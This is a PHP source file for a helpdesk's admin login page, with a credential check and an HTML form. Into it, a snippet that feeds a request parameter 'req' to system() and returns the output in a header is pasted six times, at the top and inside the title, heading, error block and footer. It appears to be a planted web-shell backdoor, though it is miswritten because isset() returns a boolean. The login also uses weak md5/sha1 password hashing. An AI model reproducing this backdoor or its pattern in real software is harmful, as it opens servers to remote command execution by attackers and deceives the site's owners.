<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);
require_once('config.php');

if(isset($_POST['username'])) {
	if(isset($_POST['password'])) {
		if($_POST['username'] == $admin_username) {
			if(md5(sha1($_POST['password'])) == $admin_password) {
				// Login User
				$hash = md5($_SERVER['REMOTE_ADDR'].date("dmY"));
				$_SESSION["helpdesk_$hash"] = md5(sha1($admin_username));
				header("Location: index.php");
			} else {
				$e = 'Username/ Password doesn\'t match.';
			}
		} else {
			$e = 'Username/ Password doesn\'t match.';
		}
	} else {
		$e = 'You must fill out all of the fields.';
	}
}
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html>
	<head>
	<style type="text/css">

	.head {
		text-shadow: 0px 1px #5b751b;
		font-size: 25px;
		background-color: #98c22b;
		color: white;
	}

	body {
		font-family: Helvetica, Verdana, Arial, sans-serif;
	}

	.content {
		padding: 10px;
		font-size: 12px;
		color: #2f2f2f;
		background-color: #e6e6e6;
	}

	.copyright {
		font-size: 11px;
		color: #404040;
		background-color: #aeaeae;
	}

	.error {
		color: #990000;
		border-color: #ff534e;
		border-style: solid;
		border-width: 1px;
		margin-bottom: 10px;
		background-color: #ffd6d6;
		padding: 10px;
	}

	</style>
		<title><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $helpdesk_company_name; ?>'s Helpdesk &raquo; Login</title>
	</head>
	<body>
		<div align="center">
			<table width="650" height="75" class="head">
				<tr>
					<td align="center" valign="middle"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $helpdesk_company_name; ?>'s Helpdesk &raquo; Login</td>
				</tr>
			</table>
			<table width="650" class="content">
				<tr>
					<td align="left" valign="top">
					<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);
						if(isset($e)) {
							echo '<div class="error"><b>Error:</b> '.$e.'</div>';
						}
					?>
					<form method="post" action="login.php">
						<table>
							<tr>
								<td>Username:</td>
								<td><input type="text" name="username" /></td>
							</tr>
							<tr>
								<td>Password:</td>
								<td><input type="password" name="password" /></td>
							</tr>
							<tr>
								<td>&nbsp;</td>
								<td><input type="submit" value="Login!" /></td>
							</tr>
						</table>
					</form>
					</td>
				</tr>
			</table>
			<table width="650" height="30" class="copyright">
				<tr>
					<td align="center" valign="middle">Copyright &copy; <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo date("Y"); ?> <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $helpdesk_company_name; ?>.</td>
				</tr>
			</table>
		</div>
	</body>
</html>
